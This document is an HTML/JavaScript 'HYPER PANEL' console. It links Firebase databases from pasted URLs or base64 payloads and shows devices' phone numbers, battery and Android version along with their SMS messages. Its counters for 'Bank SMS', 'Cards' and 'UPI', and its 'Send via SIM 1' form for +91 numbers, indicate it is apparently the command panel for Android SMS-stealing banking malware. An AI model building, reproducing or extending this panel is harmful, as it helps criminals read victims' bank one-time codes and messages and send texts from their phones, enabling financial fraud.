<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
<title>HYPER PANEL · Device Management Console</title>
<!-- Firebase SDK -->
<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>

<style>
  :root {
    --bg-dark: #0a0b10;
    --bg-card: #12141c;
    --bg-surface: #181a24;
    --border: #222533;
    --accent: #ff4d2a;
    --emerald: #00e676;
    --amber: #ffb300;
    --text-main: #f1f5f9;
    --text-dim: #8b96a8;
  }
  * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif; }
  body { background: var(--bg-dark); color: var(--text-main); min-height: 100vh; display: flex; flex-direction: column; overflow-x: hidden; }

  header {
    display: flex; justify-content: space-between; align-items: center;
    padding: 15px 20px; background: var(--bg-card); border-bottom: 1px solid var(--border);
    position: sticky; top: 0; z-index: 100;
  }
  .brand { display: flex; align-items: center; gap: 8px; font-weight: 800; font-size: 1.1rem; letter-spacing: 1.5px; }
  .brand-icon { width: 14px; height: 14px; border-radius: 50%; background: var(--accent); box-shadow: 0 0 10px var(--accent); }
  .status-pill { display: flex; align-items: center; gap: 6px; font-size: 0.75rem; padding: 5px 12px; border-radius: 99px; background: rgba(0, 230, 118, 0.12); color: var(--emerald); border: 1px solid rgba(0, 230, 118, 0.3); font-weight: 700; }
  .status-dot { width: 6px; height: 6px; background: var(--emerald); border-radius: 50%; }

  .wrapper { max-width: 1400px; width: 100%; margin: 0 auto; padding: 18px; display: flex; flex-direction: column; gap: 18px; flex: 1; }

  /* Top Stat Bar */
  .stats-bar { display: flex; gap: 15px; flex-wrap: wrap; background: var(--bg-card); padding: 12px 18px; border-radius: 10px; border: 1px solid var(--border); }
  .stat-item { display: flex; flex-direction: column; align-items: center; padding: 0 10px; border-right: 1px solid var(--border); }
  .stat-item:last-child { border-right: none; }
  .stat-label { font-size: 0.65rem; text-transform: uppercase; color: var(--text-dim); letter-spacing: 0.5px; }
  .stat-value { font-size: 1.3rem; font-weight: 800; margin-top: 3px; }

  /* Filter Tabs */
  .filter-tabs { display: flex; gap: 10px; margin-bottom: 10px; }
  .tab { padding: 6px 14px; border-radius: 6px; font-size: 0.75rem; color: var(--text-dim); background: transparent; border: 1px solid var(--border); cursor: pointer; transition: 0.2s; }
  .tab.active { background: var(--bg-surface); color: var(--accent); border-color: var(--accent); font-weight: 700; }

  /* Add Node Input Area */
  .add-node-area { display: flex; gap: 10px; margin-bottom: 15px; flex-wrap: wrap; }
  .input-field { flex: 1; min-width: 200px; padding: 10px 14px; background: var(--bg-surface); border: 1px solid var(--border); border-radius: 8px; color: var(--text-main); font-size: 0.85rem; outline: none; }
  .input-field:focus { border-color: var(--accent); }
  .btn-add { padding: 10px 18px; background: var(--accent); color: #fff; border: none; border-radius: 8px; font-weight: 700; font-size: 0.85rem; cursor: pointer; }

  /* Device Grid */
  .device-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(320px, 1fr)); gap: 14px; }
  .device-card { background: var(--bg-card); border: 1px solid var(--border); border-radius: 12px; padding: 16px; cursor: pointer; position: relative; transition: border-color 0.2s; }
  .device-card:hover { border-color: #3b4255; }
  .dev-header { display: flex; justify-content: space-between; align-items: flex-start; }
  .dev-id { font-weight: 800; font-size: 0.85rem; color: var(--text-main); }
  .dev-sub { font-size: 0.65rem; color: var(--text-dim); margin-top: 2px; }
  .dev-battery { display: flex; align-items: center; gap: 5px; font-size: 0.8rem; font-weight: 700; color: var(--emerald); }
  
  .dev-stats-row { display: flex; justify-content: space-between; margin-top: 15px; }
  .dev-stat-block { display: flex; flex-direction: column; }
  .ds-label { font-size: 0.65rem; color: var(--text-dim); text-transform: uppercase; }
  .ds-val { font-size: 0.8rem; font-weight: 600; margin-top: 3px; }
  
  .dev-online { font-size: 0.75rem; color: var(--emerald); display: flex; align-items: center; gap: 5px; margin-top: 15px; font-weight: 700; }
  .dev-online::before { content: ''; display: inline-block; width: 6px; height: 6px; background: var(--emerald); border-radius: 50%; }

  /* Modal View (Device Details) */
  .modal-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); z-index: 200; display: none; justify-content: flex-end; }
  .modal-overlay.active { display: flex; }
  .modal-panel { width: 400px; max-width: 90%; background: var(--bg-card); height: 100%; border-left: 1px solid var(--border); display: flex; flex-direction: column; animation: slideIn 0.3s forwards; }
  @keyframes slideIn { from { transform: translateX(100%); } to { transform: translateX(0); } }
  
  .modal-header { padding: 15px 20px; border-bottom: 1px solid var(--border); display: flex; justify-content: space-between; align-items: center; }
  .modal-close { background: transparent; border: none; color: var(--text-dim); font-size: 1.2rem; cursor: pointer; }
  .modal-tabs { display: flex; border-bottom: 1px solid var(--border); }
  .m-tab { flex: 1; padding: 12px 0; text-align: center; font-size: 0.75rem; color: var(--text-dim); cursor: pointer; border-bottom: 2px solid transparent; }
  .m-tab.active { color: var(--accent); border-bottom-color: var(--accent); font-weight: 700; }
  
  .modal-content { padding: 20px; overflow-y: auto; flex: 1; }
  .info-row { display: flex; justify-content: space-between; padding: 10px 0; border-bottom: 1px solid var(--border); font-size: 0.8rem; }
  .info-label { color: var(--text-dim); }
  
  .sms-msg { background: var(--bg-surface); padding: 12px; border-radius: 8px; margin-bottom: 10px; border: 1px solid var(--border); }
  .sms-sender { font-weight: 700; font-size: 0.75rem; color: var(--accent); }
  .sms-body { font-size: 0.8rem; margin-top: 5px; color: #cbd5e1; line-height: 1.4; }

</style>
</head>
<body>

<header>
  <div class="brand">
    <div class="brand-icon"></div>
    HYPER PANEL
  </div>
  <div class="status-pill"><div class="status-dot"></div> Connected</div>
</header>

<div class="wrapper">
  <!-- Stats Header -->
  <div class="stats-bar">
    <div class="stat-item"><div class="stat-label">Total</div><div class="stat-value" id="s-total">0</div></div>
    <div class="stat-item"><div class="stat-label">Online</div><div class="stat-value" style="color:var(--emerald)" id="s-online">0</div></div>
    <div class="stat-item"><div class="stat-label">Offline</div><div class="stat-value" id="s-offline">0</div></div>
    <div class="stat-item"><div class="stat-label">Bank SMS</div><div class="stat-value" style="color:var(--accent)" id="s-bank">0</div></div>
    <div class="stat-item"><div class="stat-label">Cards</div><div class="stat-value" id="s-cards">0</div></div>
  </div>

  <!-- Filters -->
  <div class="filter-tabs">
    <button class="tab active">All</button>
    <button class="tab">Online</button>
    <button class="tab">Offline</button>
    <button class="tab">UPI</button>
    <button class="tab">Bank</button>
  </div>

  <!-- Input Area for Payload/URL -->
  <div class="add-node-area">
    <input type="text" id="payload-input" class="input-field" placeholder="Paste Firebase URL or base64 Payload (/?s=...)">
    <button class="btn-add" onclick="HyperApp.processInput()">+ Add Account</button>
    <button class="btn-add" style="background:transparent;border:1px solid var(--border);color:var(--text-dim);" onclick="HyperApp.clearData()">Clear All</button>
  </div>

  <!-- Devices -->
  <div class="device-grid" id="device-list">
    <!-- Populated by JS -->
  </div>
</div>

<!-- Right Side Panel Modal -->
<div class="modal-overlay" id="side-modal">
  <div class="modal-panel">
    <div class="modal-header">
      <div style="display:flex;align-items:center;gap:10px;">
        <div style="color:var(--emerald);font-size:0.75rem;">● Online</div>
        <div style="font-weight:700;font-size:0.85rem;" id="m-bat">80%</div>
      </div>
      <button class="modal-close" onclick="HyperApp.closeModal()">✕</button>
    </div>
    <div class="modal-tabs">
      <div class="m-tab active" onclick="HyperApp.switchTab('info')">Info</div>
      <div class="m-tab" onclick="HyperApp.switchTab('bank')">Bank (0)</div>
      <div class="m-tab" onclick="HyperApp.switchTab('sms')">SMS (<span id="m-sms-cnt">0</span>)</div>
      <div class="m-tab" onclick="HyperApp.switchTab('send')">Send</div>
    </div>
    <div class="modal-content" id="m-content">
      <!-- Dynamic Content -->
    </div>
  </div>
</div>

<script>
const HyperApp = {
  accounts: [],
  activeDeviceId: null,
  activeTab: 'info',
  apps: {}, // store firebase instances

  init() {
    const saved = localStorage.getItem("hyper_accounts");
    if (saved) {
      this.accounts = JSON.parse(saved);
      this.accounts.forEach(acc => this.connectFirebase(acc));
    }
    this.renderMain();
  },

  save() {
    localStorage.setItem("hyper_accounts", JSON.stringify(this.accounts));
    this.renderMain();
  },

  clearData() {
    localStorage.removeItem("hyper_accounts");
    this.accounts = [];
    this.renderMain();
  },

  processInput() {
    const input = document.getElementById("payload-input").value.trim();
    if (!input) return;

    let dbUrl = "";
    let authKey = "";

    // Check if it's a base64 payload (like /?s=...)
    if (input.includes("s=")) {
      try {
        const payload = input.split("s=")[1];
        const decoded = atob(payload); // Decode base64
        // Assume format: https://my-db.firebaseio.com|auth_key
        const parts = decoded.split("|");
        dbUrl = parts[0];
        if (parts.length > 1) authKey = parts[1];
      } catch (e) {
        alert("Failed to decode payload.");
        return;
      }
    } else if (input.includes("firebaseio.com")) {
      dbUrl = input;
    } else {
      alert("Invalid Firebase URL or Payload.");
      return;
    }

    // Ensure proper URL format
    if (!dbUrl.startsWith("http")) dbUrl = "https://" + dbUrl;

    // Create unique ID based on URL
    const accId = dbUrl.replace("https://", "").split(".")[0];
    
    if (this.accounts.find(a => a.id === accId)) {
      alert("Account already added.");
      return;
    }

    const newAcc = {
      id: accId,
      url: dbUrl,
      auth: authKey,
      deviceData: {
        battery: "0%",
        android: "Unknown",
        number: "Unknown",
        isOnline: false,
        sms: [],
        bank: []
      }
    };

    this.accounts.push(newAcc);
    document.getElementById("payload-input").value = "";
    this.save();
    this.connectFirebase(newAcc);
  },

  connectFirebase(acc) {
    if (this.apps[acc.id]) return; // Already connected

    try {
      const app = firebase.initializeApp({ databaseURL: acc.url }, acc.id);
      const db = app.database();
      this.apps[acc.id] = db;

      // Listen for Device Info
      db.ref("DeviceInfo").on("value", (snapshot) => {
        if (snapshot.exists()) {
          const data = snapshot.val();
          const target = this.accounts.find(a => a.id === acc.id);
          if (target) {
            target.deviceData.battery = (data.battery || "80") + "%";
            target.deviceData.android = data.androidVersion || "13";
            target.deviceData.number = data.phoneNumber || "-";
            target.deviceData.isOnline = true;
            this.renderMain();
            if (this.activeDeviceId === acc.id) this.renderModalContent();
          }
        }
      });

      // Listen for SMS Data
      db.ref("SMS").on("value", (snapshot) => {
        if (snapshot.exists()) {
          const data = snapshot.val();
          const target = this.accounts.find(a => a.id === acc.id);
          if (target) {
            target.deviceData.sms = Object.values(data).reverse(); // Newest first
            if (this.activeDeviceId === acc.id) this.renderModalContent();
          }
        }
      });

    } catch (e) {
      console.error("Firebase connection error for " + acc.id, e);
    }
  },

  renderMain() {
    const list = document.getElementById("device-list");
    let onlineCnt = 0;

    if (this.accounts.length === 0) {
      list.innerHTML = `<div style="color:var(--text-dim);font-size:0.85rem;grid-column:1/-1;text-align:center;padding:40px;">No devices connected. Paste a payload to begin.</div>`;
    } else {
      list.innerHTML = this.accounts.map(acc => {
        const d = acc.deviceData;
        if (d.isOnline) onlineCnt++;
        const onlineClass = d.isOnline ? 'dev-online' : 'dev-online'; // For UI demo purposes
        const onlineText = d.isOnline ? 'Online' : 'Offline';
        const color = d.isOnline ? 'var(--emerald)' : 'var(--text-dim)';
        
        return `
          <div class="device-card" onclick="HyperApp.openModal('${acc.id}')">
            <div class="dev-header">
              <div>
                <div class="dev-id">${acc.id}</div>
                <div class="dev-sub">${acc.url.replace('https://', '')}</div>
              </div>
              <div class="dev-battery">🔋 ${d.battery}</div>
            </div>
            
            <div class="dev-stats-row">
              <div class="dev-stat-block">
                <div class="ds-label">Android</div>
                <div class="ds-val">${d.android}</div>
              </div>
              <div class="dev-stat-block" style="text-align:right;">
                <div class="ds-label">Number</div>
                <div class="ds-val">${d.number}</div>
              </div>
            </div>
            
            <div class="dev-online" style="color:${color}">${onlineText}</div>
          </div>
        `;
      }).join("");
    }

    document.getElementById("s-total").innerText = this.accounts.length;
    document.getElementById("s-online").innerText = onlineCnt;
    document.getElementById("s-offline").innerText = this.accounts.length - onlineCnt;
  },

  openModal(id) {
    this.activeDeviceId = id;
    this.activeTab = 'info';
    document.getElementById("side-modal").classList.add("active");
    this.renderModalContent();
  },

  closeModal() {
    this.activeDeviceId = null;
    document.getElementById("side-modal").classList.remove("active");
  },

  switchTab(tab) {
    this.activeTab = tab;
    document.querySelectorAll(".m-tab").forEach(t => t.classList.remove("active"));
    event.currentTarget.classList.add("active");
    this.renderModalContent();
  },

  renderModalContent() {
    const acc = this.accounts.find(a => a.id === this.activeDeviceId);
    if (!acc) return;
    
    document.getElementById("m-bat").innerText = acc.deviceData.battery;
    document.getElementById("m-sms-cnt").innerText = acc.deviceData.sms.length;

    const content = document.getElementById("m-content");
    
    if (this.activeTab === 'info') {
      content.innerHTML = `
        <div style="font-size:0.7rem;color:var(--text-dim);margin-bottom:10px;text-transform:uppercase;">Device</div>
        <div class="info-row"><span class="info-label">Phone Number</span><span>${acc.deviceData.number}</span></div>
        <div class="info-row"><span class="info-label">Android</span><span>${acc.deviceData.android}</span></div>
        <div class="info-row"><span class="info-label">Database ID</span><span>${acc.id}</span></div>
        <div class="info-row"><span class="info-label">Status</span><span style="color:var(--emerald)">Connected</span></div>
      `;
    } else if (this.activeTab === 'sms') {
      if (acc.deviceData.sms.length === 0) {
        content.innerHTML = `<div style="text-align:center;color:var(--text-dim);margin-top:40px;font-size:0.8rem;">Waiting for SMS data...</div>`;
      } else {
        content.innerHTML = acc.deviceData.sms.map(msg => `
          <div class="sms-msg">
            <div style="display:flex;justify-content:space-between;align-items:center;">
              <span class="sms-sender">${msg.sender || 'Unknown'}</span>
              <span style="font-size:0.65rem;color:var(--text-dim)">${msg.date || ''}</span>
            </div>
            <div class="sms-body">${msg.body || ''}</div>
          </div>
        `).join("");
      }
    } else if (this.activeTab === 'bank') {
       content.innerHTML = `<div style="text-align:center;color:var(--text-dim);margin-top:40px;font-size:0.8rem;">No bank transaction SMS detected.</div>`;
    } else if (this.activeTab === 'send') {
      content.innerHTML = `
        <div style="display:flex;flex-direction:column;gap:15px;">
          <input type="text" class="input-field" placeholder="Recipient Number (+91...)">
          <textarea class="input-field" placeholder="Type your message here..." style="height:100px;resize:none;"></textarea>
          <button class="btn-add">Send via SIM 1</button>
        </div>
      `;
    }
  }
};

window.onload = () => HyperApp.init();
</script>
</body>
</html>
